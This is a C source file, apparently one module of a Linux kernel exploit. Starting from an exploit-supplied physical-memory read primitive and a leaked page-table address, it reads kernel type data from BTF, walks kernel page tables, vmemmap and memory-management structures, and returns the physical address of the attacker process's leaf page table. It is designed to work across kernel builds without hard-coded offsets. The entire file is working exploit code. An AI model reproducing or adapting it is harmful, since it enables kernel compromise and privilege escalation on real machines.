/* pagemap.c: offset-free page-table walk and zero-seed bootstrap to leaf_pt_phys (pure logic; caller wires phys_read). */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include "pagemap.h"

/* ===== caller-provided physical read (the exploit's pipe forge) ===== */
static int (*pm_pread)(unsigned long pa, void *buf, unsigned long len);

void pm_set_read(int (*rd)(unsigned long, void *, unsigned long))
{
    pm_pread = rd;
}

/* ===== paging constants (x86_64 5-level) ===== */
#define PG_P     0x1UL
#define PG_PSE   0x80UL
#define PA_MASK  0x000ffffffffff000UL   /* 4K frame bits [51:12] */
#define PA_1G    0x000fffffc0000000UL   /* 1G huge frame bits [51:30] */
#define PA_2M    0x000fffffffe00000UL   /* 2M huge frame bits [51:21] */

/* struct offsets (nothing static): pm_btf_init() resolves every one BY NAME from
   /sys/kernel/btf/vmlinux before pm_bootstrap runs. */
static long off_page_mapping;
static long off_anonvma_rb;
static long off_rbc_leftmost;
static long off_avc_vma;
static long off_avc_rb;
static long off_vma_start;
static long off_vma_end;
static long off_vma_mm;
static long off_mm_pgd;
static long off_rb_right;
static long off_rb_left;
static long off_rb_parent;
static long sz_page;

/* ===== BTF offset resolver (pure userland) =====
   Parses /sys/kernel/btf/vmlinux (world-readable) and resolves struct member byte-offsets BY
   NAME. Recurses into ANONYMOUS members (page.mapping is inside an anon union; mm_struct fields
   under an anon struct, possibly RANDSTRUCT-shuffled). Handles the kind_flag bitfield encoding. */
struct btf_hdr_ {
    uint16_t magic;
    uint8_t version;
    uint8_t flags;
    uint32_t hdr_len;
    uint32_t type_off;
    uint32_t type_len;
    uint32_t str_off;
    uint32_t str_len;
};
struct btf_type_ {
    uint32_t name_off;
    uint32_t info;
    uint32_t st;            /* size | type */
};
struct btf_mem_ {
    uint32_t name_off;
    uint32_t type;
    uint32_t offset;
};
#define BK(i)  (((i) >> 24) & 0x1f)    /* kind */
#define BVL(i) ((i) & 0xffff)          /* vlen */
#define BKF(i) ((i) >> 31)             /* kind_flag */

static unsigned char *g_btf;
static struct btf_hdr_ *g_bh;
static struct btf_type_ **g_bt;
static uint32_t g_nbt;

static const char *bstr(uint32_t o)
{
    return (const char *)(g_btf + g_bh->hdr_len + g_bh->str_off + o);
}

static int btf_extra_(uint32_t info)
{
    int vlen = BVL(info);
    switch (BK(info)) {
        case 1:
            return 4;            /* INT */
        case 3:
            return 12;           /* ARRAY */
        case 4:
        case 5:
            return vlen * 12;    /* STRUCT / UNION (btf_member) */
        case 6:
            return vlen * 8;     /* ENUM */
        case 19:
            return vlen * 12;    /* ENUM64 */
        case 13:
            return vlen * 8;     /* FUNC_PROTO */
        case 15:
            return vlen * 12;    /* DATASEC */
        case 14:
            return 4;            /* VAR */
        case 17:
            return 4;            /* DECL_TAG */
        default:
            return 0;
    }
}

static int btf_load_(void)
{
    int fd = open("/sys/kernel/btf/vmlinux", O_RDONLY);
    if (fd < 0) {
        return -1;
    }
    long cap = 1 << 20;
    long len = 0;
    g_btf = malloc(cap);
    for (;;) {
        if (len + 65536 > cap) {
            cap *= 2;
            g_btf = realloc(g_btf, cap);
        }
        long r = read(fd, g_btf + len, 65536);
        if (r <= 0) {
            break;
        }
        len += r;
    }
    close(fd);
    g_bh = (struct btf_hdr_ *)g_btf;
    if (g_bh->magic != 0xeB9F) {
        return -1;
    }
    unsigned char *types = g_btf + g_bh->hdr_len + g_bh->type_off;
    unsigned char *end = types + g_bh->type_len;
    uint32_t count = 0;
    for (unsigned char *p = types; p < end; ) {
        count++;
        p += 12 + btf_extra_(((struct btf_type_ *)p)->info);
    }
    g_bt = calloc(count + 2, sizeof(void *));
    g_nbt = count;
    uint32_t id = 1;
    for (unsigned char *p = types; p < end; id++) {
        g_bt[id] = (struct btf_type_ *)p;
        p += 12 + btf_extra_(((struct btf_type_ *)p)->info);
    }
    return 0;
}

/* skip typedef / const / volatile / restrict / type_tag */
static uint32_t btf_strip_(uint32_t id)
{
    for (int i = 0; i < 16 && id && id <= g_nbt; i++) {
        int kind = BK(g_bt[id]->info);
        if (kind == 8 || kind == 9 || kind == 10 || kind == 11 || kind == 18) {
            id = g_bt[id]->st;
        } else {
            break;
        }
    }
    return id;
}

static long btf_find_member_(uint32_t tid, const char *mname, long base)
{
    if (!tid || tid > g_nbt) {
        return -1;
    }
    struct btf_type_ *bt = g_bt[tid];
    int kind = BK(bt->info);
    if (kind != 4 && kind != 5) {
        return -1;
    }
    int vlen = BVL(bt->info);
    int kf = BKF(bt->info);
    struct btf_mem_ *m = (struct btf_mem_ *)((unsigned char *)bt + 12);
    for (int i = 0; i < vlen; i++) {
        uint32_t bit_off = kf ? (m[i].offset & 0xffffff) : m[i].offset;
        long off = base + (long)bit_off / 8;
        const char *mn = bstr(m[i].name_off);
        if (*mn) {
            if (!strcmp(mn, mname)) {
                return off;
            }
        } else {
            uint32_t ut = btf_strip_(m[i].type);     /* anonymous member -> recurse */
            if (ut && ut <= g_nbt && (BK(g_bt[ut]->info) == 4 || BK(g_bt[ut]->info) == 5)) {
                long r = btf_find_member_(ut, mname, off);
                if (r >= 0) {
                    return r;
                }
            }
        }
    }
    return -1;
}

/* byte offset of s.m, or -1 */
static long btf_off(const char *s, const char *m)
{
    for (uint32_t id = 1; id <= g_nbt; id++) {
        struct btf_type_ *bt = g_bt[id];
        int kind = BK(bt->info);
        if ((kind == 4 || kind == 5) && BVL(bt->info) > 0 && !strcmp(bstr(bt->name_off), s)) {
            long r = btf_find_member_(id, m, 0);
            if (r >= 0) {
                return r;
            }
        }
    }
    return -1;
}

/* sizeof(struct s), or -1 */
static long btf_size(const char *s)
{
    for (uint32_t id = 1; id <= g_nbt; id++) {
        struct btf_type_ *bt = g_bt[id];
        int kind = BK(bt->info);
        if ((kind == 4 || kind == 5) && BVL(bt->info) > 0 && !strcmp(bstr(bt->name_off), s)) {
            return (long)bt->st;
        }
    }
    return -1;
}

static int g_btf_ready = 0;

int pm_btf_init(const char **bad)
{
    if (g_btf_ready) {
        return 0;
    }
    if (btf_load_() < 0) {
        if (bad) {
            *bad = "btf load";
        }
        return -1;
    }
    struct { const char *type; const char *member; long *out; } wanted[] = {
        {"page", "mapping", &off_page_mapping},
        {"anon_vma", "rb_root", &off_anonvma_rb},
        {"rb_root_cached", "rb_leftmost", &off_rbc_leftmost},
        {"anon_vma_chain", "vma", &off_avc_vma},
        {"anon_vma_chain", "rb", &off_avc_rb},
        {"vm_area_struct", "vm_start", &off_vma_start},
        {"vm_area_struct", "vm_end", &off_vma_end},
        {"vm_area_struct", "vm_mm", &off_vma_mm},
        {"mm_struct", "pgd", &off_mm_pgd},
        {"rb_node", "rb_right", &off_rb_right},
        {"rb_node", "rb_left", &off_rb_left},
        {"rb_node", "__rb_parent_color", &off_rb_parent},
    };
    for (unsigned i = 0; i < sizeof(wanted) / sizeof(wanted[0]); i++) {
        long v = btf_off(wanted[i].type, wanted[i].member);
        if (v < 0) {
            if (bad) {
                *bad = wanted[i].member;
            }
            return -1;
        }
        *wanted[i].out = v;
    }
    sz_page = btf_size("page");
    if (sz_page < 0) {
        if (bad) {
            *bad = "sizeof(page)";
        }
        return -1;
    }
    g_btf_ready = 1;
    return 0;
}

/* ===== discovered state ===== */
static unsigned long g_itp = 0;        /* init_top_pgt phys (universal translator root) */
static unsigned long g_vmemmap = 0;    /* vmemmap_base (VA) */
static unsigned long g_mm = 0;         /* our mm_struct (kva), captured during the D0 walk */

/* Page cache: a walk reads many entries from the SAME table page. Forging a fresh window per
   8-byte read would exhaust the single fill, so read each 4KB table page ONCE and index it in
   userland. Read-only during bootstrap, so no coherence concern. */
#define PMC_N 24
static unsigned long pmc_pa[PMC_N];
static unsigned char pmc_buf[PMC_N][4096];
static int pmc_valid[PMC_N];
static int pmc_next;

static unsigned long rd64(unsigned long pa)
{
    unsigned long page = pa & ~0xfffUL;
    unsigned long v = 0;
    for (int i = 0; i < PMC_N; i++) {
        if (pmc_valid[i] && pmc_pa[i] == page) {
            memcpy(&v, pmc_buf[i] + (pa & 0xfffUL), 8);
            return v;
        }
    }
    int slot = pmc_next;
    pmc_next = (pmc_next + 1) % PMC_N;
    if (!pm_pread || pm_pread(page, pmc_buf[slot], 4096) < 0) {
        pmc_valid[slot] = 0;
        return 0;
    }
    pmc_pa[slot] = page;
    pmc_valid[slot] = 1;
    memcpy(&v, pmc_buf[slot] + (pa & 0xfffUL), 8);
    return v;
}

/* canonical VA from a PML5 slot index (sign-extend bit 56 for LA57) */
static unsigned long slot_va(int slot)
{
    unsigned long v = (unsigned long)slot << 48;
    if (slot & 0x100) {
        v |= 0xFE00000000000000UL;     /* set bits [63:57] */
    }
    return v;
}

/* generic 5-level walk through page-table root `root`; returns phys of `va` (or 0).
   huge-page aware at PUD (1G) and PMD (2M). */
static unsigned long pm_walk(unsigned long root, unsigned long va)
{
    static const int sh[5] = {48, 39, 30, 21, 12};   /* PML5 P4D PUD PMD PTE */
    unsigned long tbl = root;
    for (int lvl = 0; lvl < 5; lvl++) {
        unsigned long idx = (va >> sh[lvl]) & 0x1ff;
        unsigned long ent = rd64(tbl + idx * 8);
        if (!(ent & PG_P)) {
            return 0;
        }
        if (lvl == 4) {
            return (ent & PA_MASK) | (va & 0xfffUL);
        }
        if (lvl >= 2 && (ent & PG_PSE)) {
            unsigned long mask = (lvl == 2) ? PA_1G : PA_2M;
            unsigned long off = va & ((lvl == 2) ? 0x3fffffffUL : 0x1fffffUL);
            return (ent & mask) | off;
        }
        tbl = ent & PA_MASK;
    }
    return 0;
}

/* kernel VA -> phys via the universal translator (direct map, vmemmap, vmalloc). */
static unsigned long k2p(unsigned long kva)
{
    return pm_walk(g_itp, kva);
}

/* scan for init_top_pgt around the trampoline-leaked level4. init_top_pgt[511] points at
   level4_kernel_pgt and sits a few pages BELOW it (head_64.S order); scan -1,+1,-2,+2,... so
   the true -4 lands in ~7 reads. [511]==level4 is ~2^-64 unique; a wrong hit is caught
   downstream when vmemmap/D0 validation fails. */
static unsigned long pm_find_itp(unsigned long level4_phys)
{
    for (int step = 1; step <= 48; step++) {
        for (int dir = -1; dir <= 1; dir += 2) {
            int k = dir * step;
            if (k > 8 || k < -40) {
                continue;
            }
            unsigned long ca = level4_phys + (long)k * 0x1000L;
            if ((long)ca < 0x1000) {
                continue;
            }
            unsigned long ent = rd64(ca + 511 * 8);
            if ((ent & PG_P) && (ent & PA_MASK) == level4_phys) {
                return ca;
            }
        }
    }
    return 0;
}

/* lowest present 2MB-PMD VA inside PML5 slot `top` (== region base for a 2MB-mapped region). */
static unsigned long pm_lowest_pmd_va(int top)
{
    unsigned long e5 = rd64(g_itp + (unsigned long)top * 8);
    if (!(e5 & PG_P)) {
        return 0;
    }
    unsigned long p4d = e5 & PA_MASK;
    for (int i = 0; i < 512; i++) {          /* P4D slot */
        unsigned long e4 = rd64(p4d + (unsigned long)i * 8);
        if (!(e4 & PG_P) || (e4 & PG_PSE)) {
            continue;
        }
        unsigned long pud = e4 & PA_MASK;
        for (int j = 0; j < 512; j++) {      /* PUD slot */
            unsigned long e3 = rd64(pud + (unsigned long)j * 8);
            if (!(e3 & PG_P)) {
                continue;
            }
            if (e3 & PG_PSE) {
                return slot_va(top) | ((unsigned long)i << 39) | ((unsigned long)j << 30);
            }
            unsigned long pmd = e3 & PA_MASK;
            for (int k = 0; k < 512; k++) {  /* PMD slot */
                unsigned long e2 = rd64(pmd + (unsigned long)k * 8);
                if (!(e2 & PG_P)) {
                    continue;
                }
                return slot_va(top) | ((unsigned long)i << 39) | ((unsigned long)j << 30) | ((unsigned long)k << 21);
            }
        }
    }
    return 0;
}

/* identify the vmemmap slot + base, validated against D0's struct page. */
static int pm_find_vmemmap(unsigned long d0_pfn)
{
    for (int i = 256; i < 511; i++) {
        unsigned long e5 = rd64(g_itp + (unsigned long)i * 8);
        if (!(e5 & PG_P)) {
            continue;
        }
        unsigned long base = pm_lowest_pmd_va(i);
        if (!base) {
            continue;
        }
        unsigned long sp = pm_walk(g_itp, base + d0_pfn * sz_page);
        if (!sp) {
            continue;
        }
        unsigned long mapping = rd64(sp + off_page_mapping);
        /* valid anon struct page: ANON tag (bit 0) + high-canonical anon_vma pointer */
        if ((mapping & 0x1UL) && (mapping & 0x8000000000000000UL) && pm_walk(g_itp, mapping & ~0x3UL)) {
            g_vmemmap = base;
            return 0;
        }
    }
    return -1;
}

/* rb in-order successor (all reads via the universal translator). */
static unsigned long rb_next(unsigned long node)
{
    unsigned long np = k2p(node);
    if (!np) {
        return 0;
    }
    unsigned long right = rd64(np + off_rb_right);
    if (right) {
        unsigned long n = right;
        for (int i = 0; i < 48; i++) {
            unsigned long pp = k2p(n);
            if (!pp) {
                break;
            }
            unsigned long left = rd64(pp + off_rb_left);
            if (!left) {
                break;
            }
            n = left;
        }
        return n;
    }
    unsigned long cur = node;
    for (int i = 0; i < 48; i++) {
        unsigned long pp = k2p(cur);
        if (!pp) {
            return 0;
        }
        unsigned long parent = rd64(pp + off_rb_parent) & ~0x3UL;
        if (!parent) {
            return 0;
        }
        unsigned long ppa = k2p(parent);
        if (!ppa) {
            return 0;
        }
        if (rd64(ppa + off_rb_left) == cur) {
            return parent;
        }
        cur = parent;
    }
    return 0;
}

/* D0 struct page -> anon_vma -> vma(covers VR) -> mm.pgd -> our pgd phys. */
static unsigned long pm_pgd_from_d0(unsigned long d0_pfn, unsigned long vr_va)
{
    unsigned long sp = pm_walk(g_itp, g_vmemmap + d0_pfn * sz_page);
    if (!sp) {
        return 0;
    }
    unsigned long mapping = rd64(sp + off_page_mapping);
    if (!(mapping & 0x1UL)) {                 /* D0 must be anon */
        return 0;
    }
    unsigned long av = mapping & ~0x3UL;
    unsigned long av_pa = k2p(av);
    if (!av_pa) {
        return 0;
    }
    unsigned long node = rd64(av_pa + off_anonvma_rb + off_rbc_leftmost);   /* rb_root_cached.rb_leftmost */
    for (int i = 0; i < 256 && node; i++) {
        unsigned long avc = node - off_avc_rb;
        unsigned long avc_pa = k2p(avc);
        if (!avc_pa) {
            node = rb_next(node);
            continue;
        }
        unsigned long vma = rd64(avc_pa + off_avc_vma);
        unsigned long vma_pa = k2p(vma);
        if (!vma_pa) {
            node = rb_next(node);
            continue;
        }
        unsigned long vs = rd64(vma_pa + off_vma_start);
        unsigned long ve = rd64(vma_pa + off_vma_end);
        if (vr_va >= vs && vr_va < ve) {
            unsigned long mm = rd64(vma_pa + off_vma_mm);
            g_mm = mm;                         /* stash mm (kva) for mm->owner -> our task */
            unsigned long mm_pa = k2p(mm);
            if (!mm_pa) {
                return 0;
            }
            unsigned long pgd_kva = rd64(mm_pa + off_mm_pgd);
            return k2p(pgd_kva);               /* our pgd phys */
        }
        node = rb_next(node);
    }
    return 0;
}

/* walk OUR pgd for VR down to the PMD entry; PMD[VR] & PA_MASK == leaf PT == leaf_pt_phys. */
static unsigned long pm_leaf_pt_from_pgd(unsigned long pgd_phys, unsigned long vr_va)
{
    static const int sh[4] = {48, 39, 30, 21};
    unsigned long tbl = pgd_phys;
    for (int lvl = 0; lvl < 4; lvl++) {
        unsigned long ent = rd64(tbl + (((vr_va >> sh[lvl]) & 0x1ff) * 8));
        if (!(ent & PG_P)) {
            return 0;
        }
        if (lvl >= 2 && (ent & PG_PSE)) {     /* huge -> no leaf PT (we MADV_NOHUGEPAGE'd VR) */
            return 0;
        }
        if (lvl == 3) {
            return ent & PA_MASK;             /* PMD entry -> leaf_pt */
        }
        tbl = ent & PA_MASK;
    }
    return 0;
}

/* public entry: bootstrap leaf_pt_phys from the trampoline leak + a known D0 PFN.
   level4_phys : trampoline-leaked level4_kernel_pgt phys (PML5[511] target)
   d0_pfn      : PFN of one of OUR VR data pages (from ent[0])
   vr_va       : the VR virtual address (to pick the right vma)
   returns leaf_pt_phys, or 0 (sets *stage to the failing step: 1=itp 2=vmemmap 3=pgd 4=leaf_pt 5=btf). */
unsigned long pm_bootstrap(unsigned long level4_phys, unsigned long d0_pfn,
                           unsigned long vr_va, int *stage)
{
    const char *bad = 0;
    if (pm_btf_init(&bad) < 0) {
        if (stage) {
            *stage = 5;
        }
        return 0;
    }
    g_itp = pm_find_itp(level4_phys);
    if (!g_itp) {
        if (stage) {
            *stage = 1;
        }
        return 0;
    }
    if (pm_find_vmemmap(d0_pfn) < 0) {
        if (stage) {
            *stage = 2;
        }
        return 0;
    }
    unsigned long pgd = pm_pgd_from_d0(d0_pfn, vr_va);
    if (!pgd) {
        if (stage) {
            *stage = 3;
        }
        return 0;
    }
    unsigned long leaf = pm_leaf_pt_from_pgd(pgd, vr_va);
    if (!leaf) {
        if (stage) {
            *stage = 4;
        }
        return 0;
    }
    if (stage) {
        *stage = 0;
    }
    return leaf;
}

/* accessors for the caller (diagnostics / reuse of the universal translator + BTF). */
unsigned long pm_itp(void)
{
    return g_itp;
}

unsigned long pm_vmemmap_base(void)
{
    return g_vmemmap;
}

unsigned long pm_kva2pa(unsigned long kva)
{
    return k2p(kva);
}

long pm_off(const char *s, const char *m)
{
    return btf_off(s, m);
}

long pm_szpage(void)
{
    return sz_page;
}

unsigned long pm_mm(void)
{
    return g_mm;
}
